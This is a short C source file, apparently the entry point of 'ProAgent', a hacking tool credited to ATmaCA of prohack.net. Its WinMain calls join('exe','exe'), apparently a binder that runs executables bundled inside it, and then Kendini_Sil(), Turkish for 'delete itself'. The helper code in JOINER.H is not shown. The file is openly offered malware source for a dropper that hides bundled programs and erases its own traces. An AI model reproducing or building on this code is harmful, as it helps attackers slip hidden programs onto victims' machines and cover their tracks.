/*===================================
ProAgent coded By ATmaCA
http://www.atmacasoft.com
atmaca@prohack.net
===================================*/
#include "stdafx.h"
#include "JOINER.H"

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	//shell32.lib ve #include <Shellapi.h> unutma!!!
	join("exe","exe");
        Kendini_Sil();
	return 0;
}


